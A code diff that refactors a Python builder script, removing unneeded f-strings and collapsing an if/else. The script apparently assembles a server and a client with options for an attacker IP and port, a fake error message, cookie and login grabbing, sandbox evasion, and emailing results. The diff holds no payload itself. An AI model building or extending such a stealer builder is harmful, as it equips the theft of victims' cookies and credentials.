@@ -178,9 +178,9 @@ def build_server(filename="server", icon="server.ico", port=80, nobuild=True, li
 
 def build_message(server, client):
     if not server:
-        print(f"[-] Error building the server")
+        print("[-] Error building the server")
     if not client:
-        print(f"[-] Error building the client")
+        print("[-] Error building the client")
     if server and client:
         os.system("cls")
         print(
@@ -196,7 +196,7 @@ def check_valid_port(port):
         raise argparse.ArgumentTypeError(
             f"Port {port} is invalid. Please use numbers between 1 and 65534")
     except ValueError:
-        raise ValueError(f"Port needs to be an integer")
+        raise ValueError("Port needs to be an integer")
 
 
 def set_arguments(parser: argparse.ArgumentParser, error_message: str):
@@ -242,11 +242,14 @@ def parse_arguments():
         return False
 
     reset_folders()
-    if not args.email_bool:
-        server = build_server(
-            port=args.port, nobuild=args.noserver, linux=args.linux)
-    else:
-        server = True
+    server = (
+        True
+        if args.email_bool
+        else build_server(
+            port=args.port, nobuild=args.noserver, linux=args.linux
+        )
+    )
+
     client = build_client(ip_address=args.ip, error_bool=args.error_bool, error_message=args.message,
                           cookies=args.cookies_bool, login=args.login_bool, port=args.port, nobuild=args.noclient, sandbox=args.sandbox, email=args.email_bool, username=args.username, password=args.password)
     build_message(server, client)
